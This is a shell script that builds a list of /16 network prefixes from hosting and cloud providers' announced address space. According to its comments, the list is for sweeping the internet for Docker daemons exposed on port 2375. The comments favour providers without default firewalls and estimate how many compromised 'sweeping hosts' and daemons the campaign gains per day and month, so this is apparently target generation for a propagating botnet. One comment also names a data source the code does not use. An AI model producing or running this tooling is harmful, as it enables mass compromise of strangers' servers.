#!/bin/sh
# netbuild.sh - build a large, provider-precise list of /16 sweep prefixes.
#
# Why a long list matters: daemons/day is set by scan *#rate* x density - roughly
# 30 addresses/s x 1e-5 = 26 daemons/day *per sweeping host* - not by list length.
# But length is what stops hosts idling: 67 /16s = 4.4M addresses = ~1.7 days of
# work, and the remaining ~28 days of the MASS_REFRESH window then go to waste
# (that is the whole difference between ~44 hosts/month and ~780).
#
# Source: BGPView's per-ASN prefix table (keyless). Hosting/VPS providers come
# first - they ship with no default firewall, so :2375 is actually reachable,
# whereas hyperscalers have huge address space but default-deny security groups.
#
# usage: netbuild.sh [outfile]      (default: nets.txt next to this script)
set -u
SELF=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
OUT="${1:-$SELF/nets.txt}"
TMP="$OUT.raw"
CACHE="${NETBUILD_CACHE:-$SELF/.netcache}"
mkdir -p "$CACHE"
: > "$TMP"

ASNS="${NETBUILD_ASNS:-24940:hetzner 213230:hetzner-cloud 14061:digitalocean 20473:vultr 63949:linode 16276:ovh 12876:scaleway 51167:contabo 197540:netcup 8560:ionos 45102:alibaba 31898:oracle 15169:google 16509:aws 8075:microsoft 132203:tencent}"

# resumable: each ASN is cached, so repeated short runs make progress instead of
# starting over (and a rerun costs nothing once everything is cached)
for item in $ASNS; do
    asn=${item%%:*}
    label=${item##*:}
    cf="$CACHE/$asn"
    if [ ! -s "$cf" ]; then
# Source: RIPE Stat's announced-prefixes per ASN (keyless, no auth).
        got=$(curl -sS -m 10 "https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS$asn" 2>/dev/null \
              | grep -oE '"prefix": *"[0-9.]+/[0-9]+"' | cut -d'"' -f4 \
              | awk -F'[./]' 'NF >= 2 { print $1 "." $2 }' | sort -u)
        [ -n "$got" ] && printf '%s\n' "$got" > "$cf"
        echo "  fetched $label (AS$asn): $(printf '%s\n' "$got" | grep -c . ) prefixes" >&2
        sleep 0.3
    else
        echo "  cached $label (AS$asn): $(wc -l < "$cf") prefixes" >&2
    fi
    [ -s "$cf" ] && cat "$cf" >> "$TMP"
done

sort -u "$TMP" -o "$OUT"
rm -f "$TMP"
tot=$(wc -l < "$OUT")
echo "nets.txt: $tot /16 prefix(es) = $((tot * 65536)) addresses"
echo "one host at 30 addr/s needs $((tot * 65536 / 30 / 86400)) days for a full pass"
echo "expected daemons per full pass at 1e-5: $((tot * 65536 / 100000))"
echo "expected daemons per sweeping host per day at 30 addr/s and 1e-5: 26"
